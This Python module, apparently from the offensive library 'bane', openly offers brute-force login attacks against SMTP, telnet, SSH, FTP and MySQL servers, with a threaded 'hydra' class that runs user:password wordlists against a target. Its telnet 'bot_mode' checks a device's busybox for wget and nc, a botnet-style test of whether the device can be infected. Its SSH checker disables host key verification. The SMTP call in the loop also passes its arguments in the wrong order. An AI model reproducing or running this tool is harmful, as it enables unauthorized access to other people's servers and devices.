from bane.bruteforce.utils import *
"""
  the next functions are used to check the login credentials you provide, it can be used for bruteforce attacks.

  it returns True if the given logins, else it returns False.

  example:

  >>>host='125.33.32.11'
  >>>wordlist=['admin:admin','admin123:admin','user:password']
  >>>for x in wordlist:
      user=x.split(':')[0]
      pwd=x.split(':')[1]
      print '[*]Trying:',user,pwd
      if bane.telnet(host,username=user,password=pwd)==True:
       print'[+]Found!!!'
      else:
       print'[-]Failed'

"""


def smtp(u, username, password, p=25, ehlo=True, helo=False, ttls=False):
    try:
        s = smtplib.SMTP(u, p)  # connect to smtp server
        if ehlo == True:
            s.ehlo()  # ehlo
            if ttls == True:
                s.starttls()  # ttls
        if helo == True:
            s.helo()  # helo
            if ttls == True:
                s.starttls()
        s.login(username, password)
        return True
    except Exception as e:
        pass
    return False


def telnet(u, username, password, p=23, timeout=5, bot_mode=False):
    try:
        t = xtelnet.session()
        t.connect(u, username=username, password=password, p=p, timeout=timeout)
        if bot_mode == True:
            a = t.execute("busybox")
        t.destroy()
        if bot_mode == True:
            if "wget" in a or "nc" in a:
                return True
            return False
        return True
    except:
        pass
    return False


# why i used this code for ssh brute force instead of: pexpext/paramiko ? Well pexpect doesn't work on non-linux machines and paramiko gives a huuuuge number of false positive results ! you will see, with this code there is no false positive brute force ;)


def ssh(u, username, password, p=22, timeout=5, exchange_key=None):
    if os.name == "nt":
        if exchange_key != None:  # this doesn't work on windows for some reason :(
            return False
        l = 'echo y | plink -ssh -l {} -pw {} {} -P {} "hvbjkjk"'.format(
            username, password, u, p
        )
        sshp = subprocess.Popen(
            l.split(),
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            shell=True,
        )
    else:
        if exchange_key:
            key = "-oHostKeyAlgorithms=+" + exchange_key
        else:
            key = ""
        l = "sshpass -p {} ssh {} -p {} -o StrictHostKeyChecking=no -l {} {} 'exithg'".format(
            password, key, p, username, u
        )  # we use the sshpass command to send the password
        sshp = subprocess.Popen(
            l.split(),
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
        )
    ti = time.time()
    while sshp.poll() is None:
        time.sleep(0.1)
        # print(ssh.stdout.readlines())
        if int(time.time() - ti) == timeout:
            try:
                sshp.kill()
            except:
                pass
            return False
    ou = sshp.communicate()
    try:
        sshp.kill()
    except:
        pass
    time.sleep(0.1)
    if exchange_key == None:
        if "Their offer:" in ou[1].decode("utf-8"):
            if os.name == "nt":
                return False
            k = ou[1].decode("utf-8").split("offer:")[1].strip()
            return ssh(u, username, password, p=p, timeout=timeout, exchange_key=k)
    if "Server refused to start a shell/command" in ou[1].decode("utf-8"):
        return True
    if (
        ("unsupported" in ou[1].decode("utf-8").lower())
        or ("denied" in ou[1].decode("utf-8").lower())
        or ("FATAL ERROR" in ou[1].decode("utf-8"))
        or ("refused" in ou[1].decode("utf-8").lower())
        or ("Unsupported KEX algorithm" in ou[1].decode("utf-8"))
        or ("Bad SSH2 KexAlgorithms" in ou[1].decode("utf-8"))
    ):
        return False
    else:
        return True


def ftp_anon(ip, timeout=5):
    # anonymous ftp login
    try:
        ftp = FTP(ip, timeout=timeout)
        ftp.login()
        return True
    except Exception as e:
        pass
    return False


def ftp(ip, username, password, timeout=5):
    try:
        i = False
        ftp = FTP(ip, timeout=timeout)
        ftp.login(username, password)
        return True
    except Exception as e:
        pass
    return False


def mysql(u, username, password, timeout=5, p=3306):
    try:
        s=pymysql.connect(host=u,port=p,user=username,password=password,connect_timeout=timeout)
        s.close()
        return True
    except Exception as e:
        pass
    return False


class hydra:
    __slots__ = ["stop", "finish", "result", "logs"]

    def __init__(
        self,
        u,
        p=22,
        protocol="ssh",
        word_list=[],
        threads_daemon=True,
        logs=True,
        exchange_key=None,
        timeout=5,
        ehlo=False,
        helo=True,
        ttls=False,
        proxy=None,
        proxies=None,
        user_agent=None,
        cookie=None,
        headers={}
    ):
        """
        this function is similar to hydra tool to bruteforce attacks on different ports.

        protocol: (set by default to: ssh) set the chosen protocol (ftp, ssh, telnet, smtp and mysql) and don't forget to set the port."""
        self.logs = logs
        self.stop = False
        self.finish = False
        self.result = {}
        t = threading.Thread(
            target=self.crack,
            args=(
                u,
                p,
                protocol,
                word_list,
                logs,
                exchange_key,
                timeout,
                ehlo,
                helo,
                ttls,
                proxy,
                proxies,
                user_agent,
                cookie,
                headers,
            ),
        )
        t.daemon = threads_daemon
        t.start()

    def crack(
        self,
        u,
        p,
        protocol,
        word_list,
        logs,
        exchange_key,
        timeout,
        ehlo,
        helo,
        ttls,
        proxy,
        proxies,
        user_agent,
        cookie,
        headers
    ):
        o = ""
        if protocol == "telnet":
            s = telnet
        if protocol == "ssh":
            s = ssh
        if protocol == "ftp":
            s = ftp
        if protocol == "smtp":
            s = smtp
        if protocol == "mysql":
            s = mysql
        if protocol == "wp":
            s = wpadmin
        for x in word_list:
            if self.stop == True:
                break
            user = x.split(":")[0].strip()
            pwd = x.split(":")[1].strip()
            if self.logs == True:
                print("[*]Trying ==> {}:{}".format(user, pwd))
            if protocol == "ssh":
                r = s(u, user, pwd, timeout=timeout, p=p, exchange_key=exchange_key)
            elif protocol == "telnet":
                r = s(u, user, pwd, timeout=timeout, p=p)
            elif protocol == "mysql":
                r = s(u, user, pwd, timeout=timeout, p=p)
            elif protocol == "ftp":
                r = s(u, user, pwd, timeout=timeout)
            elif protocol == "wp":
                if proxy:
                    proxy = proxy
                if proxies:
                    proxy = random.choice(proxies)
                r = s(
                    u,
                    user,
                    pwd,
                    proxy=proxy,
                    user_agent=user_agent,
                    cookie=cookie,
                    timeout=timeout,
                    headers=headers
                )
            elif protocol == "smtp":
                r = s(u, p, user, pwd, ehlo=ehlo, helo=helo, ttls=ttls)
            else:
                r = s(u, user, pwd, timeout=timeout)
            if r == True:
                if self.logs == True:
                    print("[+]Found!!!")
                o = "{}:{}".format(user, pwd)
                break
            else:
                if self.logs == True:
                    print("[-]Failed")
        self.result = {u: o}
        self.finish = True


